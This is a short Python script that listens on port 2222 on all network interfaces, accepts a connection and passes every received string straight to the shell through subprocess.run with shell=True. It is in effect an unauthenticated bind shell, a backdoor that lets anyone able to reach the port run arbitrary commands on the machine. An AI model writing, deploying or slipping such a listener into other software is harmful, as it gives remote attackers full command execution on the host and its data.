import socket
import subprocess

HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 2222        # Port to listen on (non-privileged ports are > 1023

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    conn, addr = s.accept()
    with conn:
        print('Connected by', addr)
        while True:
            data = conn.recv(1024)
            if not data:
                break
            cmd = data.decode('utf-8')
            subprocess.run(cmd, shell=True)